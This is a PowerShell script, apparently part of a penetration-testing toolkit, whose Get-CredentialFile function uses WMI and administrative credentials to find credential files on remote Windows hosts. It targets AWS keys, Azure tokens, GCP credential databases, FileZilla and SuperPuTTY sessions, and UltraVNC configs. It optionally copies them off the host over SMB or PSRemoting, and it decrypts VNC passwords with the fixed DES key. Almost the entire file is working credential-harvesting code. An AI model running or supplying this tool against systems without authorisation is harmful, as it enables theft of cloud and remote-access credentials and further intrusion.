#requires -version 3

function Get-CredentialFile {
<#
.SYNOPSIS
    Get credentials from files located on a remote computer.
    Privileges required: high

    Author: Timothée MENOCHET (@_tmenochet)

.DESCRIPTION
    Get-CredentialFile enumerates files containing credentials on a remote host through WMI and optionally downloads them.

.PARAMETER ComputerName
    Specifies the target host.

.PARAMETER Credential
    Specifies the privileged account to use.

.PARAMETER Ping
    Ensures host is up before run.

.PARAMETER Protocol
    Specifies the protocol to use.

.PARAMETER Download
    Enables file download.

.EXAMPLE
    PS C:\> Get-CredentialFile -ComputerName SRV.ADATUM.CORP -Credential ADATUM\Administrator -Download
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerName = $env:COMPUTERNAME,

        [ValidateNotNullOrEmpty()]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]
        $Credential = [System.Management.Automation.PSCredential]::Empty,

        [Switch]
        $Ping,

        [ValidateSet('Dcom', 'Wsman')]
        [String]
        $Protocol = 'Dcom',

        [Switch]
        $Download
    )

    BEGIN {
        if ($Ping -and -not $(Test-Connection -Count 1 -Quiet -ComputerName $ComputerName)) {
            Write-Verbose "[$ComputerName] Host is unreachable."
            break
        }

        $cimOption = New-CimSessionOption -Protocol $Protocol
        $psOption = New-PSSessionOption -NoMachineProfile
        try {
            if ($Credential.Username) {
                $cimSession = New-CimSession -ComputerName $ComputerName -Credential $Credential -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
                if ($Download -and $Protocol -eq 'Wsman') {
                    $psSession = New-PSSession -ComputerName $ComputerName -Credential $Credential -SessionOption $psOption -ErrorAction Stop -Verbose:$false
                }
            }
            else {
                $cimSession = New-CimSession -ComputerName $ComputerName -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
                if ($Download -and $Protocol -eq 'Wsman') {
                    $psSession = New-PSSession -ComputerName $ComputerName -SessionOption $psOption -ErrorAction Stop -Verbose:$false
                }
            }
        }
        catch [Microsoft.Management.Infrastructure.CimException] {
            Write-Verbose "[$ComputerName] Failed to establish CIM session."
            break
        }
        catch [System.Management.Automation.Remoting.PSRemotingTransportException] {
            Write-Verbose "[$ComputerName] Failed to establish PSRemoting session."
            break
        }
    }

    PROCESS {

        # Common credential files

        Get-VncCredentialFile -CimSession $cimSession -Download:$Download -Credential $Credential -PSSession $psSession

        # User credential files

        $userFiles = @{
            # Cloud credentials
            "AWS-KeyFile"               = "\.aws\credentials"
            "Azure-Tokens"              = "\.azure\accessTokens.json"
            "Azure-Profile"             = "\.azure\azureProfile.json"
            "GCP-LegacyCreds"           = "\AppData\Roaming\gcloud\legacy_credentials"
            "GCP-CredsDb"               = "\AppData\Roaming\gcloud\credentials.db"
            "GCP-AccessTokensDb"        = "\AppData\Roaming\gcloud\access_tokens.db"
            # Sessions
            "SuperPutty-Sessions"       = "\Documents\SuperPuTTY\Sessions.xml"
            "FileZilla-SavedSessions"   = "\AppData\Roaming\FileZilla\sitemanager.xml"
            "FileZilla-RecentSessions"  = "\AppData\Roaming\FileZilla\recentservers.xml"
        }

        Get-CimInstance -ClassName Win32_UserProfile -CimSession $cimSession -Verbose:$false | ForEach-Object {
            $profilePath = $_.LocalPath
            foreach ($userFile in $userFiles.GetEnumerator()) {
                $filePath = ($_.LocalPath + $userFile.Value) -replace '\\','\\'
                $filter  = "Name='$filePath'"
                $file = Get-CimInstance -ClassName CIM_LogicalFile -Filter $filter -CimSession $cimSession -Verbose:$false
                if ($file.Name) {
                    $obj = New-Object -TypeName psobject
                    $obj | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
                    $obj | Add-Member -MemberType NoteProperty -Name 'Type' -Value $userFile.Key
                    $obj | Add-Member -MemberType NoteProperty -Name 'Location' -Value $file.Name
                    $obj | Add-Member -MemberType NoteProperty -Name 'CreationDate' -Value $file.CreationDate
                    $obj | Add-Member -MemberType NoteProperty -Name 'LastModified' -Value $file.LastModified
                    Write-Output $obj
                    if ($Download) {
                        $outputDir = "$PWD\$ComputerName"
                        $temp = $profilePath -split "\\"
                        $outputFile = "$outputDir\$($temp.get($temp.Count - 1))_$($file.FileName).$($file.Extension)"
                        New-Item -ItemType Directory -Force -Path $outputDir | Out-Null
                        if ($psSession) {
                            Get-RemoteFile -Path $file.Name -Destination $outputFile -ComputerName $ComputerName -Protocol 'PSRemoting' -PSSession $psSession
                        }
                        else {
                            Get-RemoteFile -Path $file.Name -Destination $outputFile -ComputerName $ComputerName -Protocol 'SMB' -Credential $Credential
                        }
                    }
                }
            }
        }
    }

    END {
        Remove-CimSession -CimSession $cimSession
        if ($psSession) {
            Remove-PSSession -Session $psSession
        }
    }
}

function Local:Get-VncCredentialFile {
    Param (
        [Parameter(Mandatory = $True)]
        [CimSession]
        $CimSession,

        [Switch]
        $Download,

        [Management.Automation.Runspaces.PSSession]
        $PSSession,

        [ValidateNotNullOrEmpty()]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        function Local:Get-VncDecryptedPassword ([byte[]] $EncryptedPassword) {
            if ($EncryptedPassword.Length -lt 8) {
                return ""
            }
            [byte[]] $seed = (23, 82, 107, 6, 35, 78, 88, 7)
            $key = New-Object byte[] $seed.Length
            for ($i = 0; $i -lt 8; $i++) {
                $key[$i] = (
                    (($seed[$i] -band 0x01) -shl 7) -bor
                    (($seed[$i] -band 0x02) -shl 5) -bor
                    (($seed[$i] -band 0x04) -shl 3) -bor
                    (($seed[$i] -band 0x08) -shl 1) -bor
                    (($seed[$i] -band 0x10) -shr 1) -bor
                    (($seed[$i] -band 0x20) -shr 3) -bor
                    (($seed[$i] -band 0x40) -shr 5) -bor
                    (($seed[$i] -band 0x80) -shr 7)
                )
            }
            $des = New-Object Security.Cryptography.DESCryptoServiceProvider
            $des.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
            $des.Mode = [System.Security.Cryptography.CipherMode]::ECB
            return [Text.Encoding]::UTF8.GetString($des.CreateDecryptor($key, $null).TransformFinalBlock($EncryptedPassword, 0, $EncryptedPassword.Length));
        }

        function Local:HexStringToByteArray ([string] $HexString) {    
            $byteArray = New-Object Byte[] ($HexString.Length/2);
            for ($i = 0; $i -lt $HexString.Length; $i += 2) {
                $byteArray[$i/2] = [Convert]::ToByte($HexString.Substring($i, 2), 16)
            }
            return @( ,$byteArray)
        }

        $ComputerName = $CimSession.ComputerName
    }

    PROCESS {
        $commonFiles = @(
            "C:\Program Files\UltraVNC\ultravnc.ini"
            "C:\Program Files (x86)\UltraVNC\ultravnc.ini"
            "C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini"
            "C:\Program Files (x86)\uvnc bvba\UltraVNC\ultravnc.ini"
        )

        foreach ($commonFile in $commonFiles) {
            $filePath = ($commonFile) -replace '\\','\\'
            $filter  = "Name='$filePath'"
            $file = Get-CimInstance -Class CIM_LogicalFile -Filter $filter -CimSession $CimSession -Verbose:$false
            if ($file.Name) {
                $obj = New-Object -TypeName psobject
                $obj | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
                $obj | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'VNC'
                $obj | Add-Member -MemberType NoteProperty -Name 'Location' -Value $file.Name
                $obj | Add-Member -MemberType NoteProperty -Name 'CreationDate' -Value $file.CreationDate
                $obj | Add-Member -MemberType NoteProperty -Name 'LastModified' -Value $file.LastModified

                if ($Download) {
                    $outputDir = "$PWD\$ComputerName"
                    $temp = $file.Name -split '\\'
                    $outputFile = "$outputDir\$($temp.Get($temp.Count - 1))"
                    New-Item -ItemType Directory -Force -Path $outputDir | Out-Null
                    if ($PSSession) {
                        Get-RemoteFile -Path $file.Name -Destination $outputFile -ComputerName $ComputerName -Protocol 'PSRemoting' -PSSession $PSSession
                    }
                    else {
                        Get-RemoteFile -Path $file.Name -Destination $outputFile -ComputerName $ComputerName -Protocol 'SMB' -Credential $Credential
                    }

                    $creds = New-Object -TypeName psobject
                    $reader = New-Object System.IO.StreamReader($outputFile)
                    while (($line = $reader.ReadLine()) -ne $null) {
                        if ($line.Contains("passwd=")) {
                            $pass = ($line.Split('=')[1]).Substring(0, 16)
                            $creds | Add-Member -MemberType NoteProperty -Name 'Password' -Value (Get-VncDecryptedPassword(HexStringToByteArray($pass)))
                        }
                        if ($line.Contains("passwd2=")) {
                            $pass = ($line.Split('=')[1]).Substring(0, 16)
                            $creds | Add-Member -MemberType NoteProperty -Name 'ViewOnly' -Value (Get-VncDecryptedPassword(HexStringToByteArray($pass)))
                        }
                        if ($line.Contains("PortNumber=") -and -not $line.Contains("HTTP") -and -not $line.Contains("=0")) {
                            $creds | Add-Member -MemberType NoteProperty -Name 'Port' -Value ($line.Split('=')[1])
                        }
                    }
                    $reader.Close()
                    $obj | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value $creds
                }
                Write-Output $obj
            }
        }
    }

    END {}
}

function Local:Get-RemoteFile {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True)]
        [String]
        $Path,

        [Parameter(Mandatory = $True)]
        [String]
        $Destination,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerName = $env:COMPUTERNAME,

        [ValidateSet('SMB', 'PSRemoting')]
        [String]
        $Protocol = 'SMB',

        [ValidateNotNullOrEmpty()]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]
        $Credential = [System.Management.Automation.PSCredential]::Empty,

        [Management.Automation.Runspaces.PSSession]
        $PSSession
    )

    BEGIN {
        function Local:Get-StringHash ([String]$String, $Algorithm="MD5") { 
            $stringBuilder = New-Object System.Text.StringBuilder 
            [System.Security.Cryptography.HashAlgorithm]::Create($Algorithm).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($String)) | % { 
                [Void]$stringBuilder.Append($_.ToString("x2")) 
            } 
            return $stringBuilder.ToString() 
        }
    }

    PROCESS {
        if ($PSSession) {
            # Download file via PSRemoting
            Copy-Item -Path $Path -Destination $Destination -FromSession $PSSession -Recurse
        }
        else {
            # Download file via SMB
            $fileDrive = ($Path -split ':').Get(0)
            $filePath = ($Path -split ':').Get(1)
            if ($Credential.Username) {
                $drive = Get-StringHash $ComputerName
                New-PSDrive -Name $drive -Root "\\$ComputerName\$fileDrive`$" -PSProvider "FileSystem" -Credential $Credential | Out-Null
                Copy-Item -Path "${drive}:$filePath" -Destination $Destination -Recurse
                Remove-PSDrive $drive
            }
            else {
                Copy-Item -Path "\\$ComputerName\$fileDrive`$$filePath" -Destination $Destination -Recurse
            }
        }
    }

    END {}
}